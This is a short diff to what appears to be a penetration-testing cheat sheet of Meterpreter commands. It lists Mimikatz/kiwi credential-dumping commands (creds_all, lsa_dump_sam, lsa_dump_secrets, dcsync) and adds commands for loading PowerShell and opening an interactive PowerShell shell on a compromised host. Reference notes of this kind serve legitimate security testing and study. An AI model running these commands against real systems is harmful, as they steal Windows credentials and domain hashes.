@@ -24,6 +24,10 @@ curl http://127.0.0.1:<LOCAL_PORT>
 
 # mimikatz
 load kiwi
-creds_all
-lsa_dump_sam
-lsa_dump_secrets
+help kiwi
+creds_all lsa_dump_sam lsa_dump_secrets dcsync
+
+# powershell
+load powershell
+help powershell
+powershell_shell
